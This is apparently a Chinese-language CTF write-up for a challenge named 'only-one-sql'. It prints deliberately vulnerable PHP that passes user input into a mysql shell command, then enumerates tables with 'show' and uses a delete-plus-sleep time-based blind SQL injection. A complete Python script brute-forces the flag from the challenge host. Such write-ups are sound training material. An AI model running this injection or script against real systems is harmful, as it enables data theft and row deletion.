---
title: only-one-sql
date: 2025-03-27 21:04:25
tags:
- sql注入
- sql盲注
category:
- 刷题笔记
---

# only-one-sql

首先先看题目，源码

```
<?php
highlight_file(__FILE__);
$sql = $_GET['sql'];
if (preg_match('/select|;|@|\n/i', $sql)) {
    die("你知道的，不可能有sql注入");
}
if (preg_match('/"|\$|`|\\\\/i', $sql)) {
    die("你知道的，不可能有RCE");
}
//flag in ctf.flag
$query = "mysql -u root -p123456 -e \"use ctf;select '没有select，让你执行一句又如何';" . $sql . "\"";
system($query); 没有select，让你执行一句又如何 没有select，让你执行一句又如何
```

很明显是sql注入，但是过滤了select，并且只能执行一句sql语句

所以无法通过常规查询来查询flag，可以先使用show来查看表和表结构

首先

```
查询所有表
show tables

#output
Tables_in_ctf flag
```

可以看到flag表

```
查询flag表中的所有列
show columns from flag

#output
Field Type Null Key Default Extra id varchar(300) YES NULL data varchar(300) YES NULL
```

可以看到id和data两个字段，猜测flag在字段data中

然后使用时间盲注，这里select不能用了，但是可以使用delete命令来进行时间盲注

使用语句：

```
delete from flag where data like 'f%' and sleep(5)
```

完整脚本：

```
import requests
import string

sqlstr = string.ascii_lowercase + string.digits + '-' + "{}"
url = "http://gz.imxbt.cn:20099/?sql=delete%20from%20flag%20where%20data%20like%20%27"
end="%25%27%20and%20sleep(5)"
flag=''
for i in range(1, 100):
    for c in sqlstr:
        payload = url +flag+ c + end
        try:
            r = requests.get(payload,timeout=4)
        except:
            print(flag+c)
            flag+=c
            break
```

然后就能跑出flag了











